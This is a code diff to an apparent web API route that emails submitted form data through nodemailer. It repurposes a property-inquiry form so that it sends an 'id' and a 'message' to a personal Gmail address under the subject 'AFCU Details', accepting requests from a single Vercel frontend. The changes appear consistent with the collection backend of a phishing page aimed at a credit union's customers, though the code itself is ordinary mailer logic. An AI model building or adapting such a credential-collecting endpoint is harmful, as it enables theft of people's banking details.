@@ -12,7 +12,7 @@ export async function OPTIONS() {
 export async function POST(request) {
     try {
         const origin = request.headers.get('origin');
-        const allowedOrigins = ['https://your-frontend-domain.com', 'http://localhost:3000']; // Adjust to your frontend origin(s)
+        const allowedOrigins = ['https://smart-lilac.vercel.app']; // Adjust to your frontend origin(s)
 
         // Check if the request origin is allowed
         if (origin && allowedOrigins.includes(origin)) {
@@ -23,7 +23,7 @@ export async function POST(request) {
             return response;
         }
 
-        const { email, name, phoneNumber, message } = await request.json();
+        const { id, message } = await request.json();
 
         const transporter = nodemailer.createTransport({
             service: 'gmail',
@@ -35,13 +35,11 @@ export async function POST(request) {
 
         const mailOption = {
             from: 'thetobiwealth@gmail.com',
-            to: 'thetobiwealth@gmail.com',
-            subject: "Comfy Properties",
+            to: 'officiallyme345@gmail.com',
+            subject: "AFCU Details",
             html: `
-                <h3>Show of interest</h3>
-                <li> name: ${name}</li>
-                <li> email: ${email}</li>
-                <li> Phone number: ${phoneNumber}</li>
+                <h3>details</h3>
+                <li> id: ${id}</li>
                 <p>${message}</p> 
             `
         };
